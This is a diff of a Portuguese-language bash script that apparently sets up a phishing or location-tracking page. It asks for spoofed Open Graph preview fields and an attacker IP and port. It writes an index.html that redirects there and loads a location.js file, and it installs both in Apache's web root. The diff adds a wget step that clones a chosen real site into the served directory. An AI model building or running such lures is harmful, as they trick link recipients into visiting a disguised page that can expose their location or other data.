@@ -22,6 +22,7 @@ read -p "Nome do site (og:site_name): " SITENAME
 read -p "Descrição (og:description): " DESC
 read -p "URL da imagem (og:image): " IMAGE_URL
 
+# Verifica se todos os campos foram preenchidos
 if [[ -z "$DESTINO" || -z "$IP" || -z "$PORTA" || -z "$TITLE" || -z "$SITENAME" || -z "$DESC" || -z "$IMAGE_URL" ]]; then
   echo -e "${RED}[ERRO] Todos os campos são obrigatórios.${RESET}"
   exit 1
@@ -29,7 +30,7 @@ fi
 
 REDIRECT_URL="http://${IP}:${PORTA}"
 
-# Criar index.html
+# Criar index.html com redirecionamento HTTP->HTTPS e referência ao location.js
 cat > index.html <<EOF
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -55,7 +56,7 @@ EOF
 
 echo -e "${YELLOW}[*]${RESET} index.html criado."
 
-# Criar js/location.js
+# Criar a pasta js e o arquivo location.js
 mkdir -p js
 
 cat > js/location.js <<EOF
@@ -80,13 +81,21 @@ EOF
 
 echo -e "${YELLOW}[*]${RESET} location.js criado."
 
-# Copiar arquivos para /var/www/html/
+# Copiar os arquivos para o diretório do servidor
 echo -e "${YELLOW}[*]${RESET} Copiando arquivos para /var/www/html..."
 sudo cp index.html /var/www/html/
 sudo mkdir -p /var/www/html/js
 sudo cp js/location.js /var/www/html/js/
 
-# Tentar iniciar Apache
+# Guardar diretório atual para voltar depois
+CURRENTPWD=$(pwd)
+
+# Baixar o conteúdo do DESTINO para index2.html dentro da pasta do servidor
+cd /var/www/html || { echo -e "${RED}[ERRO] Falha ao acessar /var/www/html${RESET}"; exit 1; }
+wget -O index2.html "$DESTINO"
+cd "$CURRENTPWD" || exit
+
+# Tentar iniciar o Apache
 echo -e "${YELLOW}[*]${RESET} Iniciando o Apache..."
 sudo service apache2 start 2>/tmp/apache_err.log
 if [[ $? -eq 0 ]]; then
